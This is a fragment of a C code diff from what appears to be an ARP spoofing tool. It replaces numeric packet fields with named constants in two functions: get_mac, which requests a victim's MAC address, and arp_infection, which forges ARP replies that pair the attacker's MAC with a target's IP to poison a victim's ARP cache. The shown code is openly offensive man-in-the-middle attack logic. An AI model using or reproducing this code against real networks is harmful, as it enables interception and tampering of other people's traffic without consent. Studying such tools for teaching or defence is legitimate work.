@@ -17,13 +17,13 @@ void get_mac(pcap_t* handle, char * dev, uint8_t * Sender_IP, uint8_t * Sender_M
     for(int j=0; j<6; j++)
         eth_REQ->dmac[j]=0xFF;
     memcpy(eth_REQ->smac, My_MAC, 6);
-    eth_REQ->type = htons(0x0806);
+    eth_REQ->type = htons(ETHERTYPE_ARP);
 
-    arp_REQ->htype = htons(0x0001);
+    arp_REQ->htype = htons(ARPHRD_ETHER);
     arp_REQ->ptype = htons(0x0800);
     arp_REQ->hlen = 0x06;
     arp_REQ->plen = 0x04;
-    arp_REQ->oper = htons(0x0001);
+    arp_REQ->oper = htons(ARPOP_REQUEST);
 
     memcpy(arp_REQ->smac, My_MAC, 6);
     memcpy(arp_REQ->sip, My_IP, 4);
@@ -58,7 +58,7 @@ void get_mac(pcap_t* handle, char * dev, uint8_t * Sender_IP, uint8_t * Sender_M
 
         ARP_header * arp_GET = (ARP_header *)(packet+ETHER_HEADER_SIZE);
 
-        if((ntohs(arp_GET->oper) != 0x0002) || memcmp(arp_GET->sip, Sender_IP, 4))
+        if((ntohs(arp_GET->oper) != ARPOP_REPLY) || memcmp(arp_GET->sip, Sender_IP, 4))
         {
             continue;
         }
@@ -100,13 +100,13 @@ bool arp_infection(pcap_t* handle, char * dev, uint8_t * Sender_IP, uint8_t * Ta
     ARP_header * arp_REP = (ARP_header *)(ARP_REP_PACKET+ETHER_HEADER_SIZE);
     memcpy(eth_REP->dmac, Sender_MAC, 6);
     memcpy(eth_REP->smac, My_MAC, 6);
-    eth_REP->type = htons(0x0806);
+    eth_REP->type = htons(ETHERTYPE_ARP);
 
-    arp_REP->htype = htons(0x0001);
+    arp_REP->htype = htons(ARPHRD_ETHER);
     arp_REP->ptype = htons(0x0800);
     arp_REP->hlen = 0x06;
     arp_REP->plen = 0x04;
-    arp_REP->oper = htons(0x0002);
+    arp_REP->oper = htons(ARPOP_REPLY);
 
     memcpy(arp_REP->smac, My_MAC, 6);
     memcpy(arp_REP->sip, Target_IP, 4);
